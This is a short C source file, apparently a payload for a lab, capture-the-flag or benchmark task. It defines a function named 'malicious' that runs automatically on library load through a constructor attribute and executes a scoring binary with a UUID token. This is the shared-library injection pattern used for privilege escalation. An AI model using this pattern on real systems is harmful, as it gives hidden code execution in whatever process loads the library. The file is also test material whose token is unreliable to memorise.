#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score e90f932d-3e53-4cce-8242-095ed273b955");
}
